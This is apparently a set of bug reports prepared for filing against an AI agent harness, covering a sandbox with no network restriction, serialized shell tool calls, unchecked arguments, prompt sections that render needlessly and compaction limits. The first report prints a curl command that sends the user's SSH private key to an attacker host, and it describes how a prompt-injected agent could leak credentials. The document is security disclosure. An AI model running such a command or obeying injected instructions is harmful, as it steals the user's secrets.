# Upstream reports, ready to file

DSH's [`CONTRIBUTING.md`](https://github.com/deepseek-ai/deepseek-harness/blob/main/CONTRIBUTING.md)
declines external pull requests and names **GitHub Discussions** as the channel for defects. These
are the five findings worth filing, ordered by severity, written so a maintainer can act without
re-deriving the analysis.

**I could not verify from this machine that Discussions is active**. Fetching
`https://github.com/deepseek-ai/deepseek-harness/discussions` returned GitHub's navigation chrome
instead of discussion content, so treat the channel as unconfirmed and check before posting.

A note on tone: all five are offered as defects, not as a comparison with Codex. The Codex evidence
is useful for showing a fix is tractable, but a report that reads as "your competitor does this
better" is easier to dismiss than one that shows the bug.

---

## 1. Sandbox has no network dimension (security)

**Severity: security. This is the one worth filing today.**

In a `read-only` or `workspace-write` session on macOS or Linux, a command can read any file the
user can read and send it anywhere:

```sh
curl -d @$HOME/.ssh/id_rsa https://attacker.example
```

A prompt-injected model has no harness obstacle to exfiltration.

**Evidence.** The mode vocabulary documents the omission:

> File-effect policy for confined processes. `read-only` permits only required sinks such as
> `/dev/null`; `workspace-write` also permits the workspace and a backend-defined temp area;
> `danger-full-access` bypasses confinement. **Network and process visibility are outside this
> vocabulary.**
> — `packages/sandbox/sandbox/src/index.ts:24-30`

The macOS profile grants everything except writes (`packages/sandbox/sandbox-local/src/profiles.ts:52`):

```
(version 1) (allow default) (deny file-write*) (allow file-write* (literal "/dev/null"))
```

`(allow default)` permits all operations the profile does not explicitly deny, and only
`file-write*` is denied. Linux bwrap never passes `--unshare-net`. A grep for
`unshare-net|network_access|deny network` across `packages/sandbox/` and `native/system/` returns no
hits. Landlock grants are file-only.

The repository's own notes acknowledge this and name the fix (bwrap `--unshare-net`, Landlock
ABI v4+) at `.agents/notes/implemented/feature/2026-07-06-sandbox.md:196` and
`2026-07-14-cross-family-fs-sandbox.md:56`.

**Impact.** The mode is named `read-only`, which a user reasonably reads as "cannot cause harm
outside the workspace". Unrestricted reads plus unrestricted egress means the opposite. An agent
that reads a hostile issue, a dependency's README, or a web page can be steered into sending the
user's credentials anywhere, and the sandbox will not stop it.

**Suggested shape.** A `network` dimension on `SandboxMode` (at minimum `deny`/`allow`), enforced
per backend: `--unshare-net` for bwrap, a deny-default Seatbelt profile opening only what the
harness itself needs, and a documented `partial` value where a backend cannot enforce it. The
existing `SandboxEnforcement = 'full' | 'partial'` reporting is exactly the right place to be honest
about that.

**Interim mitigation worth shipping regardless of the fence:** the permission-preset descriptions
(`packages/interaction/permission-presets/src/index.ts`) should say that `read-only` and
`workspace-write` do not restrict network access or reads. Right now a user has no way to learn this
short of reading the sandbox source.

---

## 2. `isConcurrencySafe` is not set on the shell tools

**Severity: performance, easily measured.**

Independent tool calls in one assistant message run concurrently only when a tool opts in, and the
predicate fails closed: `isConcurrencySafe(args)` must return exactly `true`
(`packages/core/tools/src/index.ts:1303-1313`). Opted in today: `read`, `read-image`, web
search/fetch, the three session-query tools, `subagent`. Not opted in: `bash`,
`bash-persistent`, `pwsh`, `write`, `edit`, all MCP-bridged tools, `run_code`.

The scheduler takes one call at a time when the mode is not `parallel`
(`packages/core/agent-loop/src/tool-calls.ts:85-100`), so a batch of shell calls pays the sum of
their durations, not the maximum.

**Reproduction.** From a recorded session, pairing `tool/call` → `tool/result` by `callId` and
comparing each step's wall span against the sum of individual durations:

```
step     n  tools          span(ms)  sumIndividual(ms)  overlap
1:11     4  subagent            61                227   YES
1:4      2  bash             28829              28828   no
1:9      2  bash              3896               3896   no
1:18     2  read,bash          216                216   no
```

Every batch containing `bash` has span == sum. In that session 16 of 30 steps issued multi-call
`bash` batches; the recoverable time was 1,005 ms of 35,962 ms, small only because the commands were
fast. A batch of a test run, a build, and a status check pays the full sum.

**Suggested shape.** An argument-aware classifier on the shell `defineTool` sites. Read-only
commands are concurrency-safe, anything that mutates is not. `write`/`edit` want a path-scoped claim
instead of a blanket `true`, so two edits to one file in a batch cannot race.

---

## 3. The parameter root accepts unknown arguments

**Severity: silent wrong behaviour.**

DSH's parameter schema never emits `additionalProperties` at the root
(`packages/core/tools/src/schema.ts:444-457`), and the validator only rejects undeclared keys when
the keyword is explicitly authored (`packages/core/tools/src/json-schema.ts:573-579`). A misspelled
argument is therefore accepted and ignored.

```
edit { file_path: "a.ts", old_str: "x", new_string: "y" }   # old_str ignored; old_string missing
```

Depending on the tool this is a no-op, a validation error elsewhere, or, worst of all, an operation that
proceeds with a default the model did not intend.

**Suggested shape.** Close the root by default and add an explicit opt-out for the few tools that
do take an open object (`workflow`, `tool-cordis`).

---

## 4. Three prompt sections render unconditionally

**Severity: token waste on restricted agents.**

Most tool guidance is correctly gated on the tool being visible, e.g.
`packages/fs/tool-fs/src/read.ts:69-75`. Three are not:

- `packages/jobs/tool-jobs/src/index.ts:250` (`tool:jobs`)
- `packages/goal/tool-goal/src/index.ts:190` (`tool:goal`)
- `packages/workflow/tool-ralph/src/index.ts:405` (`tool:ralph`)

A subagent with `toolFilter` denying those tools still pays for their guidance on every request.

**Suggested shape.** Adopt the `ctx.tools.get(name, scope) === undefined ? '' : …` pattern the other
sections already use.

---

## 5. Compaction headroom is absolute, which disables it on small windows

**Severity: latent and deployment-dependent. Check your own numbers before acting.**

`resolveCompactSpec` computes `pressureBudgetTokens = (contextWindow − reservedCompletion) −
headroomTokens` and **throws** when it is not positive
(`packages/compaction/compaction-basic/src/config.ts:181-194`). The listener downgrades that throw to
a one-time warning, so the visible effect is *no proactive compaction at all*, not an error.

With the shipped `headroomTokens: 65536`, any context window below roughly 73.5k has no auto
compaction.

On the shipped default model this does **not** bite: `deepseek-flash` declares
`contextWindow: 1_000_000` (`packages/llm/llm-deepseek/src/defaults.ts:6`), where the threshold is
`min(1_000_000 × 0.8, 934_464 − R)`. The 0.8 ratio binds for any `R` under ~134k, giving a correct
80%. The bug affects deployments that override `contextWindow` or run a smaller-window model.

**Suggested shape.** Clamp instead of throwing. The error message already tells the user to "reduce
compaction headroomTokens", which is advice the code could take itself:

```
headroom = min(headroomTokens, max(0, messageBudget − floor(contextWindow × thresholdRatio)))
```
